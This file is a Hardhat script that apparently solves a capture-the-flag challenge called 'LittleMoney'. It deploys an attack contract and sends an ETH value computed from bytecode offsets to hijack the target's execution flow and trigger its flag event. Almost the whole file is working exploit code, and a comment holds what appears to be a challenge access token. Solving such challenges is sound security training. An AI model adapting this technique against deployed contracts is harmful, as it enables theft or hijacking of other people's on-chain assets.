import chalk from "chalk";
import { ethers } from "hardhat";
import { LittleMoney__factory, LittleMoneyAttack__factory } from "../../typechain";

// deployer: 0xAeDf5768271766Ab647f5F91533e9eFD86BBB350
// token: v4.local.usu5Bwu8MRZwn4Oaq2hqbtrpBbALMZC1HaTCE6MybkJA8vQGDudzdAiUi3wEhrfasPYIXkKmYRd9Gd8LYYGmV5a1vYpZBwPrxDKUR5PJDrioXFcM16T7m81Irne4Oi-ZI64inHqYsZiW-UekM8EMixm84sCt_Brc6o1V2RzQP9tDEw.U2V0dXA

function log(s:string){
    console.log(`${chalk.green("[-] ")+s}`)
}

async function main() {
    const signers = await ethers.getSigners();
    const provider = ethers.provider;
    const network = await provider.getNetwork();
    const deployer = signers[0];
    const attacker = signers[2];

    log(`Running on the ${chalk.yellow(network.name)} network`);
    log(`Attacker address: ${chalk.yellow(attacker.address)}`);
    log(`Attacker balance: ${chalk.yellow(ethers.formatEther(await provider.getBalance(attacker)))} ETH`);

    let littleMoneyContract;
    let tx;
    if(network.name == "hardhat") {
        littleMoneyContract = await new LittleMoney__factory(deployer).deploy();
        await littleMoneyContract.waitForDeployment();
        littleMoneyContract = littleMoneyContract.connect(attacker);
        log(`Successfully deployed the target contract to address ${chalk.yellow(await littleMoneyContract.getAddress())}!`)
    } else if (network.name == "remote") {
        const contractAddress = "0x0000000000000000000000000000000000000000";
        littleMoneyContract = LittleMoney__factory.connect(contractAddress, attacker);
        log(`Successfully connected to the target contract with address ${chalk.yellow(await littleMoneyContract.getAddress())}!`)
    }

    if(littleMoneyContract) {
        const littleMoneyAttack = await new LittleMoneyAttack__factory(attacker).deploy();
        await littleMoneyAttack.waitForDeployment();
        
        // log(`Deployed code: ${await provider.getCode(await littleMoneyContract.getAddress())}`);

        let emitAddress = 0x285;
        let renounceAddress = 0x2be;
        let delta = emitAddress - renounceAddress;
        let offset = delta>0?delta:(delta+2**32);

        tx = await attacker.sendTransaction({
            to: await littleMoneyContract.getAddress(),
            value: offset
        })
        await tx.wait();
        
        const filter = littleMoneyContract.filters.SendFlag();
        littleMoneyContract.once(filter, (sender: string) => {
            log(`SendFlag event is triggered successfully!`);
            process.exit(0);
        });
        tx = await littleMoneyContract.execute(await littleMoneyAttack.getAddress());
        await tx.wait();
    }


}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});